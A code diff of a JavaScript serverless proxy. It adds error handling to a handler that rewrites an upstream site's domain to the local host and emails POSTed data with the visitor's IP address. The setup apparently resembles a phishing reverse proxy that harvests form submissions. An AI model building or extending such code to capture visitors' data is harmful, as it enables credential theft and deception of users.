@@ -41,14 +41,19 @@ export default async (req, res) => {
                 await sendToServer(message, ip_address);
             }
         } catch (error) {
-            console.error('Error processing request:', error);
+            console.error('Error processing POST request:', error);
             res.status(500).json({ error: 'Internal Server Error' });
             return;
         }
     }
 
     try {
-        const url = new URL(req.query.url);
+        const urlParam = req.query.url;
+        if (!urlParam) {
+            throw new Error('No URL parameter provided');
+        }
+
+        const url = new URL(urlParam);
         url.host = upstream;
         url.protocol = https ? 'https:' : 'http:';
         url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;
@@ -90,10 +95,15 @@ export default async (req, res) => {
 };
 
 async function replace_response_text(response, upstream_domain, host_name) {
-    let text = await response.text();
-    let re = new RegExp(upstream_domain, 'g');
-    text = text.replace(re, host_name);
-    return text;
+    try {
+        let text = await response.text();
+        let re = new RegExp(upstream_domain, 'g');
+        text = text.replace(re, host_name);
+        return text;
+    } catch (error) {
+        console.error('Error replacing response text:', error);
+        throw error;
+    }
 }
 
 async function sendToServer(data, ip_address) {
@@ -115,6 +125,6 @@ async function sendToServer(data, ip_address) {
             text: `${data}\n\nIP Address: ${ip_address}`
         });
     } catch (error) {
-        console.error('Error sending data:', error);
+        console.error('Error sending data via email:', error);
     }
 }
